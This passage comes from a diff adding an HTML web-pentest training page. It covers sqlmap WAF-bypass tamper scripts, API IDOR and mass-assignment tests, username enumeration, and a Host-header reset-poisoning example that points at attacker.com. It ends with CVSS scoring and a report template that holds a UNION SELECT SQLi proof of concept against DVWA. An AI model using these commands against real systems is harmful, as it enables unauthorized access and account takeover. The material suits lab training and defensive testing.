+  <span class="flag">--technique</span> BEUST \     <span class="cm"># specify injection types</span>
+  <span class="flag">--dbms</span> mysql            <span class="cm"># specify DB type if known</span>
+
+<span class="cm"># Bypass WAF with tamper scripts</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"URL"</span> <span class="flag">--cookie="..."</span> \
+  <span class="flag">--tamper</span>=<span class="val">"space2comment,charencode,randomcase"</span> <span class="flag">--batch</span>
+<span class="cm"># Tamper scripts modify payloads to bypass WAF signatures</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+13 — API Security Testing
+══════════════════ -->
+<div class="section" id="s13">
+  <div class="sec-head">
+    <span class="sec-num">13</span>
+    <div class="sec-meta">
+      <div class="sec-title">API Security Testing</div>
+      <div class="sec-sub">REST API testing, OWASP API Top 10, GraphQL, and mass assignment</div>
+    </div>
+    <span class="badge b-cyan">API</span>
+  </div>
+
+  <div class="theory cyan">
+    <h4>APIs Are the New Attack Surface</h4>
+    <p>Modern applications are API-first — the mobile app, single-page web app, and integrations all call APIs. APIs are frequently less secured than web UIs because they're assumed to be "internal" or because developers believe API consumers won't explore beyond documented endpoints. The <strong>OWASP API Security Top 10</strong> documents API-specific vulnerabilities distinct from the web app Top 10.</p>
+    <p>Key API vulnerabilities: <strong>Broken Object Level Authorization (BOLA/IDOR)</strong> — requesting other users' objects via ID manipulation. <strong>Mass assignment</strong> — sending extra JSON properties that get silently applied to the model (set <code style="color:var(--cyan)">{"role": "admin"}</code> on a registration endpoint). <strong>Excessive data exposure</strong> — API returns all fields, relies on client to filter. <strong>Rate limiting absent</strong> — enables brute force, data scraping, DDoS.</p>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">🔌</span>
+      <span class="ph-t">Lab 13.1 — REST API security testing with Burp, curl, and Postman</span>
+      <span class="ph-tag pt-lab">API Testing Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Discover hidden API endpoints</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Check common API documentation paths</span>
+<span class="cmd">for</span> path in api/docs api/swagger.json swagger.json api/v1 api/v2 \
+  openapi.json graphql .well-known/api api-docs; do
+  code=$(<span class="cmd">curl</span> <span class="flag">-s -o /dev/null -w "%{http_code}"</span> http://target/$path)
+  [ "$code" != "404" ] && <span class="cmd">echo</span> "$code → /$path"
+done
+
+<span class="cm"># Brute force API endpoints</span>
+<span class="cmd">ffuf</span> <span class="flag">-u</span> http://target/api/v1/FUZZ \
+  <span class="flag">-w</span> /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
+  <span class="flag">-mc</span> 200,201,204,401,403  <span class="cm"># 401/403 = exists but auth required</span>
+
+<span class="cm"># Download and search JS files for API endpoints</span>
+<span class="cmd">wget</span> http://target.com/app.js
+<span class="cmd">grep</span> <span class="flag">-oE</span> <span class="val">'/api/[a-zA-Z0-9_/.-]+'</span> app.js | <span class="cmd">sort -u</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Test BOLA/IDOR on REST API</div>
+            <div class="code" data-label="bash — API IDOR">
+<span class="cm"># Get YOUR user's data (authenticated)</span>
+<span class="cmd">curl</span> <span class="flag">-H</span> <span class="val">"Authorization: Bearer YOUR_JWT"</span> \
+  http://target/api/v1/users/1001/profile
+
+<span class="cm"># Try accessing ANOTHER user's data with YOUR token</span>
+<span class="cmd">curl</span> <span class="flag">-H</span> <span class="val">"Authorization: Bearer YOUR_JWT"</span> \
+  http://target/api/v1/users/<span class="hi">1002</span>/profile
+<span class="cm"># 200 OK with another user's data = BOLA (IDOR) confirmed</span>
+
+<span class="cm"># Try accessing admin endpoints</span>
+<span class="cmd">curl</span> <span class="flag">-H</span> <span class="val">"Authorization: Bearer YOUR_JWT"</span> \
+  http://target/api/v1/admin/users
+<span class="cm"># If 200 OK as regular user = Broken Function Level Authorization</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Mass Assignment — inject extra properties in registration</div>
+            <div class="code" data-label="bash — mass assignment">
+<span class="cm"># Normal registration request (documented)</span>
+<span class="cmd">curl</span> <span class="flag">-X POST</span> http://target/api/v1/users/register \
+  <span class="flag">-H</span> <span class="val">"Content-Type: application/json"</span> \
+  <span class="flag">-d</span> <span class="val">'{"username":"testuser","password":"test123","email":"test@test.com"}'</span>
+
+<span class="cm"># Mass assignment attack: add extra fields not in the form</span>
+<span class="cmd">curl</span> <span class="flag">-X POST</span> http://target/api/v1/users/register \
+  <span class="flag">-H</span> <span class="val">"Content-Type: application/json"</span> \
+  <span class="flag">-d</span> <span class="val">'{"username":"testuser","password":"test123","email":"test@test.com",
+  "role":"admin","isAdmin":true,"credits":99999,"verified":true}'</span>
+<span class="cm"># If any of these extra fields are applied = mass assignment vulnerability</span>
+<span class="cm"># Check user profile after registration to verify extra fields were accepted</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">4</span>
+          <div class="sc">
+            <div class="st">GraphQL security testing — introspection and query depth</div>
+            <div class="code" data-label="bash — GraphQL">
+<span class="cm"># Test if introspection is enabled (reveals full schema)</span>
+<span class="cmd">curl</span> <span class="flag">-X POST</span> http://target/graphql \
+  <span class="flag">-H</span> <span class="val">"Content-Type: application/json"</span> \
+  <span class="flag">-d</span> <span class="val">'{"query":"{__schema{types{name fields{name}}}}"}'</span>
+<span class="cm"># Full schema = understand all queries, mutations, types</span>
+<span class="cm"># Production should disable introspection</span>
+
+<span class="cm"># Query for data you shouldn't access</span>
+<span class="cmd">curl</span> <span class="flag">-X POST</span> http://target/graphql \
+  <span class="flag">-H</span> <span class="val">"Authorization: Bearer USER_TOKEN"</span> \
+  <span class="flag">-H</span> <span class="val">"Content-Type: application/json"</span> \
+  <span class="flag">-d</span> <span class="val">'{"query":"query { user(id: 1) { email password role } }"}'</span>
+<span class="cm"># Check if password or role fields are returned when they shouldn't be</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+14 — Authentication Attacks
+══════════════════ -->
+<div class="section" id="s14">
+  <div class="sec-head">
+    <span class="sec-num">14</span>
+    <div class="sec-meta">
+      <div class="sec-title">Authentication Attacks</div>
+      <div class="sec-sub">Brute force, credential stuffing, password reset flaws, and MFA bypass</div>
+    </div>
+    <span class="badge b-amber">Auth Attacks</span>
+  </div>
+
+  <div class="theory amber">
+    <h4>Authentication — The Gatekeeper That's Often Misconfigured</h4>
+    <p>Authentication systems are high-value targets — defeat them and you're inside. Common weaknesses: no rate limiting on login (enables brute force), weak password reset flows (predict or bypass tokens), session tokens that don't expire or can be forged, MFA implementations that can be bypassed via race conditions or OTP brute force, username enumeration via response difference.</p>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">🔐</span>
+      <span class="ph-t">Lab 14.1 — Username enumeration, brute force, and password reset flaw testing</span>
+      <span class="ph-tag pt-lab">Auth Testing Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Username enumeration via response difference</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Compare responses for valid vs invalid username</span>
+<span class="cmd">curl</span> <span class="flag">-s -X POST</span> http://target/login \
+  <span class="flag">-d</span> <span class="val">"username=admin&password=wrongpass"</span> | <span class="cmd">wc -c</span>
+<span class="cmd">curl</span> <span class="flag">-s -X POST</span> http://target/login \
+  <span class="flag">-d</span> <span class="val">"username=nonexistent&password=wrongpass"</span> | <span class="cmd">wc -c</span>
+<span class="cm"># Different response sizes = different messages = username enumeration</span>
+
+<span class="cm"># Response message difference examples:</span>
+<span class="cm"># Valid user:   "Incorrect password"</span>
+<span class="cm"># Invalid user: "User not found"</span>
+<span class="cm"># Even TIMING differences can reveal valid usernames (timing side-channel)</span>
+
+<span class="cm"># Automate username enumeration with ffuf</span>
+<span class="cmd">ffuf</span> <span class="flag">-u</span> http://target/login \
+  <span class="flag">-X POST -d</span> <span class="val">"username=FUZZ&password=wrongpass"</span> \
+  <span class="flag">-w</span> /usr/share/seclists/Usernames/Names/names.txt \
+  <span class="flag">-fr</span> <span class="val">"User not found"</span>  <span class="cm"># filter out the invalid user message</span>
+<span class="cm"># Results = valid usernames on this system</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Password reset vulnerability testing</div>
+            <div class="code" data-label="bash + burp">
+<span class="cm"># Common password reset flaws:</span>
+
+<span class="cm"># 1. Weak/predictable reset token</span>
+<span class="cm"># Request reset for your account, check token structure</span>
+<span class="cm"># e.g. http://target/reset?token=MTczMDA... (base64 of timestamp?)</span>
+<span class="cmd">echo</span> <span class="val">"MTczMDA"</span> | <span class="cmd">base64</span> <span class="flag">-d</span>  <span class="cm"># decode → is it a timestamp?</span>
+
+<span class="cm"># 2. Token not invalidated after use</span>
+<span class="cm"># Reset your own password, try using the same reset link again</span>
+<span class="cm"># If it still works = token reuse vulnerability</span>
+
+<span class="cm"># 3. Token in URL (visible in logs, Referer header, browser history)</span>
+<span class="cm"># Good: token in POST body | Bad: token in GET URL (?token=...)</span>
+
+<span class="cm"># 4. Host header injection in reset email</span>
+<span class="cmd">curl</span> <span class="flag">-X POST</span> http://target/forgot-password \
+  <span class="flag">-H</span> <span class="val">"Host: attacker.com"</span> \
+  <span class="flag">-d</span> <span class="val">"email=victim@example.com"</span>
+<span class="cm"># If reset email contains "http://attacker.com/reset?token=..."</span>
+<span class="cm"># Victim clicks → attacker captures token → account takeover</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Session token security analysis</div>
+            <div class="code" data-label="burp sequencer">
+<span class="cm"># Burp Sequencer analyzes entropy of session tokens</span>
+<span class="cm"># 1. Capture a response that Sets a session cookie</span>
+<span class="cm"># 2. Right-click → Send to Sequencer</span>
+<span class="cm"># 3. Configure: Cookie/Header to analyze</span>
+<span class="cm"># 4. Click "Start Live Capture" → generate 1000+ tokens</span>
+<span class="cm"># 5. Click "Analyze Now"</span>
+
+<span class="cm"># What Burp Sequencer measures:</span>
+<span class="cm"># Overall entropy: should be > 100 bits for session tokens</span>
+<span class="cm"># Character-level distribution: should be uniform</span>
+<span class="cm"># Low entropy = predictable tokens = session hijacking risk</span>
+
+<span class="cm"># Also check: session expiry</span>
+<span class="cmd">curl</span> <span class="flag">-b</span> <span class="val">"PHPSESSID=old_session_id"</span> http://target/dashboard
+<span class="cm"># After logout → old session should return 401/redirect to login</span>
+<span class="cm"># If 200 = sessions not invalidated on logout = session fixation risk</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+15 — VAPT Methodology
+══════════════════ -->
+<div class="section" id="s15">
+  <div class="sec-head">
+    <span class="sec-num">15</span>
+    <div class="sec-meta">
+      <div class="sec-title">VAPT Methodology & Standards</div>
+      <div class="sec-sub">PTES, OWASP WSTG, CVSS scoring, and professional testing approach</div>
+    </div>
+    <span class="badge b-lime">Methodology</span>
+  </div>
+
+  <div class="theory lime">
+    <h4>Following a Methodology Makes You Professional</h4>
+    <p>Ad-hoc testing misses vulnerabilities. Professional penetration testers follow structured methodologies: <strong>PTES (Penetration Testing Execution Standard)</strong> covers the full engagement lifecycle. <strong>OWASP Web Security Testing Guide (WSTG)</strong> provides detailed test cases for every web application vulnerability category — 4.2 has 91 test cases organized by category. Following WSTG ensures complete coverage and gives clients confidence that testing was thorough.</p>
+  </div>
+
+  <table class="dtable">
+    <thead><tr><th>CVSS 3.1 Score</th><th>Severity</th><th>Meaning</th><th>Response SLA</th></tr></thead>
+    <tbody>
+      <tr><td class="tr-">9.0–10.0</td><td class="tr-">CRITICAL</td><td>Unauthenticated RCE, full data breach, system takeover. Immediate escalation to executive management.</td><td class="tr-">24–48 hours</td></tr>
+      <tr><td class="ta">7.0–8.9</td><td class="ta">HIGH</td><td>Authenticated RCE, significant data exposure, privilege escalation. Immediate remediation planning.</td><td class="ta">1–2 weeks</td></tr>
+      <tr><td style="color:var(--amber);">4.0–6.9</td><td style="color:var(--amber);">MEDIUM</td><td>Significant vulnerability requiring specific conditions or user interaction. Plan in next sprint.</td><td style="color:var(--amber);">30 days</td></tr>
+      <tr><td class="tb">0.1–3.9</td><td class="tb">LOW</td><td>Minor information disclosure, theoretical attacks. Address in quarterly review.</td><td class="tb">90 days</td></tr>
+      <tr><td class="tc">0.0</td><td class="tc">INFORMATIONAL</td><td>No vulnerability — best practice recommendation or defense-in-depth suggestion.</td><td class="tc">Best effort</td></tr>
+    </tbody>
+  </table>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">📊</span>
+      <span class="ph-t">Lab 15.1 — Calculate CVSS scores for your findings</span>
+      <span class="ph-tag pt-concept">CVSS Exercise</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">CVSS 3.1 Base Score metrics explained</div>
+            <div class="code" data-label="cvss metrics">
+<span class="kw">Attack Vector (AV):</span>     Network(N) / Adjacent(A) / Local(L) / Physical(P)
+<span class="kw">Attack Complexity (AC):</span>  Low(L) / High(H)
+<span class="kw">Privileges Required (PR):</span> None(N) / Low(L) / High(H)
+<span class="kw">User Interaction (UI):</span>   None(N) / Required(R)
+<span class="kw">Scope (S):</span>               Unchanged(U) / Changed(C)
+<span class="kw">Confidentiality (C):</span>     None(N) / Low(L) / High(H)
+<span class="kw">Integrity (I):</span>           None(N) / Low(L) / High(H)
+<span class="kw">Availability (A):</span>        None(N) / Low(L) / High(H)
+
+<span class="cm">Example: SQL Injection (unauthenticated, full DB dump)</span>
+AV:N / AC:L / PR:N / UI:N / S:U / C:H / I:H / A:N
+→ CVSS Score: 9.1 (CRITICAL)
+
+<span class="cm">Example: Stored XSS (requires login, only affects current user)</span>
+AV:N / AC:L / PR:L / UI:R / S:C / C:L / I:L / A:N
+→ CVSS Score: 5.4 (MEDIUM)
+
+<span class="cm"># Calculate at: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Score your DVWA lab findings</div>
+            <div class="sd">For each finding from your DVWA labs, calculate the CVSS 3.1 Base Score. Go to the NIST CVSS calculator, enter the metrics, and record the score. This is standard practice in every professional VAPT report.</div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+16 — Report Writing Capstone
+══════════════════ -->
+<div class="section" id="s16">
+  <div class="sec-head">
+    <span class="sec-num">16</span>
+    <div class="sec-meta">
+      <div class="sec-title">VAPT Report Writing — Capstone</div>
+      <div class="sec-sub">Professional report structure, finding template, and portfolio deliverable</div>
+    </div>
+    <span class="badge b-lime">Capstone</span>
+  </div>
+
+  <div class="theory lime">
+    <h4>The Report Is the Product — Make It Count</h4>
+    <p>A technically brilliant penetration test that results in a poorly written report is a professional failure. Clients pay for actionable intelligence — clear findings with reproduction steps, business impact framing, and specific remediation guidance. A well-written VAPT report in your portfolio demonstrates you can do the full job, not just find vulnerabilities.</p>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">📝</span>
+      <span class="ph-t">Capstone — Write a full VAPT report for your DVWA assessment</span>
+      <span class="ph-tag pt-report">Portfolio Deliverable</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Report structure</div>
+            <div class="code" data-label="vapt report outline">
+<span class="kw">═══════════════════════════════════════════════════════</span>
+<span class="kw">WEB APPLICATION VULNERABILITY ASSESSMENT & PENETRATION TEST</span>
+<span class="kw">Target: DVWA v1.10 | http://localhost:8080/dvwa/</span>
+<span class="kw">Analyst: [Your Name] | Date: [Date] | Classification: CONFIDENTIAL</span>
+<span class="kw">═══════════════════════════════════════════════════════</span>
+
+<span class="ok">1. EXECUTIVE SUMMARY</span>
+   Overall Risk: CRITICAL
+   Total Findings: 8 (Critical: 2, High: 3, Medium: 2, Low: 1)
+   Critical findings: SQL Injection (CVE-equivalent), Stored XSS
+   Immediate actions required: [top 3 as bullets]
+
+<span class="ok">2. SCOPE & METHODOLOGY</span>
+   Target: DVWA 1.10 at localhost:8080
+   Test type: Grey box (credentials provided)
+   Testing period: [dates]
+   Tools: Burp Suite Community 2023.x, sqlmap 1.7, gobuster 3.x
+   Methodology: OWASP WSTG v4.2, CVSS 3.1 scoring
+
+<span class="ok">3. FINDINGS SUMMARY TABLE</span>
+   ID | Title | Severity | CVSS | URL | Status
+
+<span class="ok">4. DETAILED FINDINGS (one section per vulnerability)</span>
+   [Template below]
+
+<span class="ok">5. REMEDIATION ROADMAP</span>
+   Priority 1 (Immediate — 48hrs): SQLi, Stored XSS
+   Priority 2 (7 days): Security headers, directory listing
+   Priority 3 (30 days): Session management, error handling
+
+<span class="ok">6. APPENDIX</span>
+   A: Tool versions used
+   B: Full HTTP request/response for each finding
+   C: CVSS score breakdowns
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Individual finding template — write for each vulnerability found</div>
+            <div class="code" data-label="finding template">
+<span class="kw">Finding ID:</span>   WEB-001
+<span class="kw">Title:</span>         SQL Injection — User ID Parameter
+<span class="kw">Severity:</span>      CRITICAL
+<span class="kw">CVSS 3.1:</span>     9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+<span class="kw">CWE:</span>           CWE-89: SQL Injection
+<span class="kw">Affected URL:</span>  http://localhost:8080/dvwa/vulnerabilities/sqli/?id=[INJECTION]
+
+<span class="kw">Description:</span>
+The "id" parameter in the SQL Injection module is vulnerable to SQL
+injection. User-supplied input is concatenated directly into an SQL
+query without sanitization or parameterization, allowing attackers
+to manipulate the database query logic.
+
+<span class="kw">Proof of Concept:</span>
+Step 1: Send the following request:
+  GET /dvwa/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users-- HTTP/1.1
+  Host: localhost:8080
+  Cookie: PHPSESSID=abc123; security=low
+
+Step 2: Response contains database credentials:
+  admin | 5f4dcc3b5aa765d61d8327deb882cf99 (MD5 of "password")
+  gordonb | e99a18c428cb38d5f260853678922e03 (MD5 of "abc123")
+  [Screenshot: burp_response_sqli_001.png]
+
+<span class="kw">Business Impact:</span>
+A remote, unauthenticated attacker can:
+1. Extract complete database contents including user credentials
+2. Modify or delete database records
+3. Potentially execute OS commands via MySQL INTO OUTFILE
+All user accounts are compromised. In a production environment, this
+would constitute a reportable breach under DPDP Act 2023.
+
+<span class="kw">Remediation:</span>
+1. IMMEDIATE: Use parameterized queries / prepared statements:
+   $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
+   $stmt->execute([$user_input]);
+2. Input validation: Reject inputs that don't match expected format
+3. Least privilege: Ensure DB user cannot access other databases
+4. Enable WAF with SQLi rules (ModSecurity OWASP CRS)
+5. Error handling: Display generic errors, log details server-side
+
+<span class="kw">References:</span>
+OWASP Top 10: A03:2021 – Injection
+OWASP WSTG: WSTG-INPV-05 (SQL Injection)
+CWE-89: https://cwe.mitre.org/data/definitions/89.html
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Write findings for all 8 DVWA vulnerabilities</div>
+            <div class="code" data-label="finding list">
+<span class="tr-">WEB-001</span> | SQL Injection (Union-based)    | CRITICAL | 9.8
+<span class="tr-">WEB-002</span> | Command Injection              | CRITICAL | 9.8
+<span class="ta">WEB-003</span> | Stored XSS — Cookie Theft      | HIGH     | 7.5
+<span class="ta">WEB-004</span> | Reflected XSS                  | HIGH     | 6.1
+<span class="ta">WEB-005</span> | File Upload — Webshell         | HIGH     | 8.8
+<span class="warn">WEB-006</span> | Missing Security Headers       | MEDIUM   | 5.3
+<span class="warn">WEB-007</span> | Weak Session Token Entropy     | MEDIUM   | 5.9
+<span class="tb">WEB-008</span> | Directory Listing Enabled      | LOW      | 3.7
+
+<span class="cm"># Each finding: description, PoC, business impact, remediation, CVSS</span>
+<span class="cm"># Include Burp screenshots for each PoC</span>
+<span class="cm"># Push to GitHub as: vapt-report-dvwa-[date].pdf</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+
+  <!-- Module completion checklist -->
+  <div class="theory" style="margin-top:20px;border-left-color:var(--lime);">
+    <h4>Module Completion Checklist</h4>
+    <ul class="checklist">
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 2.1 — Inspected security headers with curl; identified missing headers as findings</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 4.1 — Exploited IDOR on DVWA; used gobuster for forced browsing; wrote IDOR finding template</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 5.1 — Manual SQLi: detection → column count → UNION SELECT → password dump → hash cracking</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 6.1 — Reflected XSS with alert; Stored XSS with cookie theft; DOM XSS via URL; BeEF hook concept</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 7.1 — Found secrets in JS; JWT alg:none attack; weak JWT secret brute force; cookie flag inspection</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 8.1 — Default credentials test; directory listing; sensitive file exposure; verbose error capture</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 9.1 — PHP object injection; identified Java serialized data; ysoserial payload concept</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 10.1 — WhatWeb fingerprinting; searchsploit CVE research; OWASP Dependency Check or npm audit</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 11.1 — Burp proxy setup; intercepted and modified login request; Repeater SQLi; Intruder brute force</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 12.1 — sqlmap: detect → list DBs → dump table → crack hashes → OS shell attempt</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 13.1 — API endpoint discovery; BOLA/IDOR testing; mass assignment; GraphQL introspection</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 14.1 — Username enumeration; password reset flow testing; session token entropy analysis</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Lab 15.1 — Calculated CVSS 3.1 scores for 5 findings using NVD calculator</span></li>
+      <li onclick="toggleCheck(this)"><span class="cb"></span><span>Capstone — Wrote complete VAPT report (8 findings, executive summary, PoC, remediation roadmap) — pushed to GitHub as PDF</span></li>
+    </ul>
+  </div>
+
+  <div class="note lime" style="margin-top:14px;">
+    <span class="ni">🏆</span>
+    <span><strong>Portfolio package for VAPT / Application Security roles:</strong> GitHub repo with (1) Full VAPT report PDF (8+ findings, CVSS scores, PoC screenshots), (2) Burp Suite project file (.burp), (3) sqlmap output logs, (4) Custom Burp extension or script (bonus). A polished VAPT report on DVWA + Juice Shop with real Burp screenshots beats most candidates at Deloitte Advisory, EY Cyber, KPMG Technology, Wipro Red Team, and MSSP penetration testing roles in India.</span>
+  </div>
+
+</div>
+
+</div><!-- /content -->
+</main>
+</div><!-- /layout -->
+
+<script>
+function toggleP(header) {
+  header.closest('.practical').classList.toggle('open');
+  updateProgress();
+}
+
+function toggleCheck(li) {
+  li.classList.toggle('done');
+  updateProgress();
+}
+
+function updateProgress() {
+  const all = document.querySelectorAll('.checklist li');
+  const done = document.querySelectorAll('.checklist li.done');
+  const pct = all.length > 0 ? Math.round((done.length / all.length) * 100) : 0;
+  document.getElementById('sb-fill').style.width = pct + '%';
+  document.getElementById('sb-pct').textContent = pct + '%';
+}
+
+// Sidebar active scroll
+const sections = document.querySelectorAll('.section');
+const navItems = document.querySelectorAll('.nav-item');
+
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      const id = entry.target.id;
+      navItems.forEach(item => {
+        item.classList.toggle('active', item.getAttribute('href') === '#' + id);
+      });
+    }
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+
+sections.forEach(s => observer.observe(s));
+
+navItems.forEach(item => {
+  item.addEventListener('click', e => {
+    const href = item.getAttribute('href');
+    if (href && href.startsWith('#')) {
+      e.preventDefault();
+      document.querySelector(href)?.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }
+  });
+});
+
+updateProgress();
+</script>
+</body>
+</html>
